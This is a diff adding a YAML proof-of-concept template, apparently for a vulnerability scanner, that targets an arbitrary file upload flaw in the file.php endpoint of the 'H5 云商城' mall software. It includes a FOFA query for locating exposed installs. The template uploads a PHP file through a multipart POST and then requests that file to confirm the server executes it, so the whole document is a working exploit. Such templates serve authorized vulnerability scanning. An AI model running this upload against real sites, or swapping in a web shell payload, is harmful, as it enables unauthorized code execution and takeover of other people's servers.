@@ -1,0 +1,34 @@
+id: poc-yaml-h5-cloud-mall-file-php-anyfile-upload
+info:
+  name: H5 云商城 file.php 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: H5云商城
+  fofa: body="/public/qbsp.php"
+variables:
+  t1: random_int(100,1000)
+  t2: random_int(100,1000)
+  t3: t1 * t2
+requests:
+- method: POST
+  path: /admin/commodtiy/file.php?upload=1
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFQqYtrIWb8iBxUCx
+  data: '------WebKitFormBoundaryFQqYtrIWb8iBxUCx
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.php"
+
+    Content-Type: application/octet-stream
+
+
+    <?php echo {{.t1}}*{{.t2}};?>
+
+    ------WebKitFormBoundaryFQqYtrIWb8iBxUCx--'
+  expression: status_code == 200 && contains(body,".php")
+  output:
+  - regex_match(body,"(?P<file>[0-9]+)")
+- method: GET
+  path: /admin/commodtiy/upload/{{.file}}.php
+  expression: status_code == 200 && body == t3
+transport: http
